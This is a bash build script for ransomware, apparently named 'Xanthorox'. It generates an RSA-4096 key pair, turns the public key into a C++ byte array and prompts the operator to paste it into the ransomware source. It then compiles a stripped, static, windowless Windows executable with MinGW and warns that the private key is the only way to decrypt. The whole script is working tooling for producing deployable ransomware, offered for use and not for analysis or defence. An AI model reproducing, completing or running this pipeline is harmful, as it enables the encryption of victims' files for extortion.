#!/bin/bash

# === Configuration ===
CPP_SOURCE_FILE="xanthorox_ransomeware.cpp" # Your C++ source file name
PYTHON_CONVERTER="pem_to_blob.py"
PRIVATE_KEY_FILE="private_key.pem"
PUBLIC_KEY_FILE="public_key.pem"
# TEMP_CPP_FILE_STAGE1 removed
# TEMP_CPP_FILE_FINAL removed
OUTPUT_EXE_FILE="xanthorox_final.exe"
MINGW_COMPILER="x86_64-w64-mingw32-g++"
RSA_KEY_BITS="4096"

# === Helper Functions ===
check_command() { if ! command -v "$1" &> /dev/null; then echo "Error: Required command '$1' not found." >&2; exit 1; fi; }
check_file() { if [ ! -f "$1" ]; then echo "Error: Required file '$1' not found." >&2; exit 1; fi; }

# === Sanity Checks ===
echo "--- Checking Prerequisites ---"
check_command openssl; check_command "$MINGW_COMPILER"; check_command python3; check_command sed; check_command grep; check_command head; check_command tail; check_command printf;
check_file "$PYTHON_CONVERTER"; check_file "$CPP_SOURCE_FILE";
echo "All prerequisites seem to be met."
echo

# === Step 1: Generate RSA Keys ===
echo "--- Generating RSA-${RSA_KEY_BITS} Key Pair ---"
if [ -f "$PRIVATE_KEY_FILE" ] || [ -f "$PUBLIC_KEY_FILE" ]; then read -p "Warning: Key files exist. Overwrite? (y/N): " confirm; if [[ ! "$confirm" =~ ^[Yy]$ ]]; then echo "Aborted key generation."; else rm -f "$PRIVATE_KEY_FILE" "$PUBLIC_KEY_FILE"; openssl genpkey -algorithm RSA -out "$PRIVATE_KEY_FILE" -pkeyopt rsa_keygen_bits:"$RSA_KEY_BITS" || exit 1; openssl rsa -pubout -in "$PRIVATE_KEY_FILE" -out "$PUBLIC_KEY_FILE" || exit 1; echo "New keys generated."; fi; else openssl genpkey -algorithm RSA -out "$PRIVATE_KEY_FILE" -pkeyopt rsa_keygen_bits:"$RSA_KEY_BITS" || exit 1; openssl rsa -pubout -in "$PRIVATE_KEY_FILE" -out "$PUBLIC_KEY_FILE" || exit 1; echo "Keys generated."; fi
echo

# === Step 2: Convert Public Key and PROVIDE INSTRUCTIONS ===
echo "--- Converting Public Key to C++ Blob ---"
echo "Running Python script..."
CPP_BYTE_ARRAY=$(python3 "$PYTHON_CONVERTER" "$PUBLIC_KEY_FILE")
CONVERTER_EXIT_CODE=$?
if [ $CONVERTER_EXIT_CODE -ne 0 ]; then echo "Error: Python converter script failed." >&2; exit 1; fi
if [ -z "$CPP_BYTE_ARRAY" ]; then echo "Error: Python converter script produced no output." >&2; exit 1; fi
echo "Public key converted successfully."
echo
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo "!!! ACTION REQUIRED: Manual Key Injection !!!"
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo
echo "1. Open your C++ source file: '$CPP_SOURCE_FILE'"
echo "2. Find the 'RSA_PUBLIC_KEY_BLOB' array definition. It should look like:"
echo "   const BYTE RSA_PUBLIC_KEY_BLOB[] = {"
echo "       0x00 // Placeholder line - MUST BE PRESENT"
echo "   };"
echo "3. DELETE the placeholder line (the one with '0x00')."
echo "4. COPY the entire byte array below (including indentation):"
echo "------------------------- START COPY -------------------------"
# Add indentation to the python output before printing
echo "$CPP_BYTE_ARRAY" | sed 's/^/    /'
echo "-------------------------- END COPY --------------------------"
echo "5. PASTE the copied bytes between the '{' and the '};' in your C++ file."
echo "6. Ensure the final structure looks like:"
echo "   const BYTE RSA_PUBLIC_KEY_BLOB[] = {"
echo "       0xXX, 0xXX, ... // Your pasted key bytes here"
echo "   }; // <--- Closing brace on its OWN line"
echo "   const DWORD RSA_PUBLIC_KEY_BLOB_SIZE = sizeof(RSA_PUBLIC_KEY_BLOB);"
echo "7. SAVE the changes to '$CPP_SOURCE_FILE'."
echo
read -p "Press [Enter] ONLY AFTER you have saved the file with the pasted key..."
echo
echo "Resuming build process..."

# === Step 3: Compile the MANUALLY Edited C++ Code ===
echo "--- Compiling Final Ransomware with MinGW ---"
# Compile the original source file directly now, assuming manual edit was done
"$MINGW_COMPILER" "$CPP_SOURCE_FILE" -o "$OUTPUT_EXE_FILE" \
   -std=c++17 -O2 -s -Wall -static \
   -lgdiplus -lwininet -lcrypt32 -ladvapi32 -luser32 -lshell32 -lole32 -loleaut32 -luuid \
   -Wl,-subsystem,windows -mwindows

COMPILE_EXIT_CODE=$?
if [ $COMPILE_EXIT_CODE -ne 0 ]; then
    echo "Error: Compilation failed (Exit Code: $COMPILE_EXIT_CODE)." >&2
    echo "       Please check the compiler errors above and your manual edits." >&2
    exit 1
fi
echo "Compilation successful!"
echo

# === Step 4: Cleanup (No temp files to clean) ===
echo "Cleanup step skipped (manual edit)."
echo

# === FINAL WARNING ===
echo "==================== !!!!!!!!!!!!!!!!!!!! ===================="
echo "          SUCCESS: '$OUTPUT_EXE_FILE' created!"
echo "      >>> CRITICAL WARNING <<<"
echo " The file '$PRIVATE_KEY_FILE' is your ONLY WAY to decrypt."
# ... rest of warning ...
echo "==================== !!!!!!!!!!!!!!!!!!!! ===================="

exit 0
